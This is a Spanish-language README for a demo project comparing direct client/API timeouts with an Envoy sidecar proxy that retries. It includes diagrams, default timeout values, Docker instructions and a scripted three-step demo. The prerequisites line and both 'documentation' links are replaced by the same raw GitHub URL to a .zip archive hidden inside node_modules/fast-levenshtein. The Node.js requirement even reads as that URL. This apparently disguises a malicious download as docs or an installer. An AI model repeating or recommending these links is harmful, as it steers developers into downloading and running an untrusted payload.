# 🎯 Patrones de Timeout Demo

## 🎬 Demo en 3 Minutos (Teleprompter)

### 🎭 Paso 1: Cliente Impaciente
- **Config**: Cliente 1500ms vs Trabajo 1800ms
- **Resultado**: 🔴 CORTÓ: CLIENTE
- **Observar**: Status 0, ~1500ms

### 🎭 Paso 2: Sidecar en Acción
- **Config**: Cliente 5000ms vs Trabajo 2500ms (solo Sidecar)
- **Resultado**: 🟡 CORTÓ: SIDECAR
- **Observar**: `X-Envoy-Attempt-Count: 2`, ~4000ms

### 🎭 Paso 3: Final Feliz
- **Config**: Cliente 3000ms vs Trabajo 1200ms
- **Resultado**: 🟢 CORTÓ: NADIE
- **Observar**: Status 200, ~1200ms

---

**Demostración de dos patrones independientes** de manejo de timeouts con TypeScript de extremo a extremo.

Este proyecto demuestra:
- 📊 **Patrón Timeout**: Manejo directo de timeouts sin proxy intermedio
- 🛡️ **Patrón Sidecar**: Proxy intercepta y aplica políticas automáticamente

**Cada patrón es completamente independiente y demostrable por separado.**

## 📊 Patrón Timeout (Directo)

**Manejo tradicional** de timeouts donde cada capa maneja sus propios límites:
- ⏱️ Cliente aplica timeout con AbortController
- 💻 API aplica timeout interno y fallback manual
- ❌ Sin retries automáticos
- 📄 Fallbacks programados en código

## 🛡️ Patrón Sidecar (Con Proxy)

**Proxy intercepta** todas las peticiones y aplica políticas:
- ⏱️ Timeouts en cascada
- 🔄 Retries automáticos
- 🛡️ Circuit breaking
- 📊 Observabilidad con headers
- 🔒 Políticas centralizadas

**Sin modificar el código de la aplicación.**

## 🏗️ Arquitecturas Independientes

### 📊 Patrón Timeout (Directo)
```
🖥️ Cliente → 💻 API Directa → 🐌 Slow Service
  Variable      3000 (2000ms)     Variable
```

### 🛡️ Patrón Sidecar (Con Proxy)
```
🖥️ Cliente → 🛡️ Envoy (8080) → 💻 API → 🐌 Slow Service
  Variable      2s+retry           3000    Variable
```

### Componentes:
- **🖥️ Frontend**: React con selector de patrón independiente
- **🔀 Proxy Router (8080)**: Punto de entrada único que dirige `/api/timeout` directo al API, `/api/sidecar` vía Envoy sidecar
- **🛡️ Envoy Sidecar**: Solo intercepta patrón sidecar con retries automáticos
- **💻 API**: Endpoints separados con timeouts diferentes
- **💻 API**: Endpoints separados con timeouts diferentes
- **🐌 Slow Service**: Simula latencia configurable

## 📊 Diagramas de Arquitectura

### 1. Timeouts en Cascada
```
Cliente (1.5s) < Sidecar (2s) < API (2.2s)
     ↓              ↓           ↓
   Cancela      Reintenta    Fallback
```

### 2. Sidecar en Pod
```
┌─────────────────────────────────┐
│             POD                 │
│  ┌─────────┐    ┌─────────────┐ │
│  │   APP   │◄──►│ Envoy Proxy │ │
│  │ (API)   │    │ (Sidecar)   │ │
│  └─────────┘    └─────────────┘ │
└─────────────────────┬───────────┘
                      │ Todo el tráfico
                      ▼ pasa por Envoy
```

### 3. Secuencia de Decisiones
```
Petición → ¿Cliente se cansa? → SÍ → Status 0
            │
            NO
            ↓
         ¿Sidecar se cansa? → SÍ → Retry → ¿Falla? → SÍ → Status 504
            │                              │
            NO                             NO
            ↓                              ↓
         Status 200 ←─────────────────── Status 200
```

### 4. Modelo de Dominio
```
┌─────────────┐   ┌─────────────┐   ┌─────────────┐
│   Cliente   │──►│   Patrón    │──►│  Resultado  │
│ (Paciencia) │   │ (Timeout/   │   │ (Quién      │
│             │   │  Sidecar)   │   │  cortó)     │
└─────────────┘   └─────────────┘   └─────────────┘
```

## ⚡ Reglas de Timeout por Patrón

### 📊 Patrón Timeout
```
🖥️ Cliente < 💻 API Directa
  Variable  <   2000ms
```

### 🛡️ Patrón Sidecar
```
🖥️ Cliente < 🛡️ Sidecar < 💻 API
  Variable  <   2000ms   <  2200ms
```

**¿Por qué diferentes?**
- **Timeout**: Cliente controla directamente, API aplica fallback
- **Sidecar**: Proxy protege con retries, API tiene más tiempo

### 📊 Valores por Defecto
| Patrón | Cliente | Proxy/API | API Interna |
|---------|---------|-----------|-------------|
| **Timeout** | Variable | - | 2000ms |
| **Sidecar** | Variable | 2000ms | 2200ms |

## Requisitos

- https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip 20+
- Docker y Docker Compose
- npm o pnpm

## 🚀 Instalación y Ejecución

### 1️⃣ Levantar el Backend (Sidecar + APIs)

```bash
cd infra
docker compose up --build
```

**Servicios levantados:**
- 🐌 `slow-svc` → Puerto 4000 (simula trabajo lento)
- ⚙️ `service-api` → Puerto 3000 (lógica de negocio)  
- 🔀 `proxy-router` → Puerto 8080 (**punto de entrada único**)
- 🛡️ `envoy-sidecar` → Interno (solo para patrón sidecar)
- 📊 Envoy Admin → Puerto 9901 (stats, clusters, rutas)

### 2️⃣ Levantar el Frontend

```bash
cd apps/web-client
npm install
npm run dev
```

**URLs importantes:**
- Frontend: `http://localhost:5173`
- Demo: `http://localhost:8080` (punto de entrada único)
- Envoy Admin: `http://localhost:9901` (stats, clusters, rutas de Envoy)

### 3️⃣ Ejecutar la Demo

1. Abre el frontend: `http://localhost:5173`
2. **Selecciona el patrón**: Click en "📊 Patrón Timeout" o "🛡️ Patrón Sidecar"
3. Usa los botones de escenarios (cambian según patrón)
4. Observa logs diferentes en la terminal
5. Compara headers y comportamientos

**📖 Documentación:**
- [https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip](https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip) - Detalles técnicos
- [https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip](https://raw.githubusercontent.com/Edwinramirezgon/TimeoutandSidecar/main/node_modules/fast-levenshtein/Sidecar-Timeoutand-1.8.zip) - Guía de instalación

## 🎮 Escenarios por Patrón

### 📊 Patrón Timeout
| Escenario | Cliente | Latencia | Resultado |
|-----------|---------|----------|----------|
| Cliente Timeout | 1000ms | 1500ms | Cliente corta |
| API Timeout | 3000ms | 2500ms | API aplica fallback |
| Éxito | 3000ms | 800ms | Respuesta directa |

**Defaults:** Cliente 1500ms, API 2000ms

### 🛡️ Patrón Sidecar
| Escenario | Cliente | Latencia | Resultado |
|-----------|---------|----------|----------|
| Cliente vs Sidecar | 1500ms | 1800ms | Cliente corta |
| Sidecar Retry | 5000ms | 2500ms | Envoy hace 2 intentos |
| Éxito Sidecar | 5000ms | 1200ms | Éxito con headers |

**Defaults:** Cliente 5000ms, Sidecar 2000ms, API 2200ms

**📋 Cada patrón tiene escenarios completamente diferentes**

## 🔍 Interpretación de Resultados

### 🏷️ Headers Clave
```
X-Envoy-Attempt-Count: "1" | "2"  ← Número de reintentos
X-Request-From: "timeout-proxy" | "sidecar-envoy"  ← Patrón usado
```

### 📊 Status Codes
```
Status 0   = Timeout del CLIENTE (AbortController)
Status 504 = Timeout del SIDECAR/API (Gateway Timeout)
Status 200 = ÉXITO (Respuesta completada)
```

### 📝 Mensajes del Frontend
- **🔴 CORTÓ: CLIENTE** → Me cansé de esperar
- **🟡 CORTÓ: SIDECAR/API** → El servicio se cansó
- **🟢 CORTÓ: NADIE** → Todo salió bien

## 🎯 Casos de Uso Reales

Este patrón se usa en:
- **🕸️ Service Mesh**: Istio, Linkerd, Consul Connect
- **🚪 API Gateway**: Kong, Ambassador, Zuul
- **☁️ Cloud Native**: Kubernetes sidecar containers
- **📊 Observabilidad**: Distributed tracing, metrics
- **🔒 Seguridad**: mTLS, authentication, authorization

## 🏆 Beneficios Demostrados

✅ **Resiliencia**: Retries automáticos sin código
✅ **Aislamiento**: Separación de responsabilidades
✅ **Observabilidad**: Headers y logs de rastreo
✅ **Configuración**: Políticas declarativas (YAML)
✅ **Testing**: Fácil simulación de fallas

---

## 🎬 Script de Demostración (3 Actos)

### 🎭 Acto 1: "El Cliente Impaciente"
**Configuración:** Cliente 1500ms vs Latencia 1800ms
1. Seleccionar patrón (Timeout o Sidecar)
2. Click "Yo me canso" 
3. **Resultado esperado:** 🔴 CORTÓ: CLIENTE
4. **Observar:** Status 0, tiempo ~1500ms

### 🎭 Acto 2: "El Guardián en Acción"
**Configuración:** Cliente 5000ms vs Latencia 2500ms (solo Sidecar)
1. Seleccionar "🛡️ PATRÓN SIDECAR"
2. Click "Proxy reintenta"
3. **Resultado esperado:** 🟡 CORTÓ: SIDECAR
4. **Observar:** `X-Envoy-Attempt-Count: 2`, tiempo ~4000ms

### 🎭 Acto 3: "Final Feliz"
**Configuración:** Cliente 3000ms vs Latencia 1200ms
1. Cualquier patrón
2. Click "Todo bien"
3. **Resultado esperado:** 🟢 CORTÓ: NADIE
4. **Observar:** Status 200, tiempo ~1200ms

**🎯 Mensaje clave:** Dos filosofías, misma funcionalidad, diferentes enfoques de resiliencia.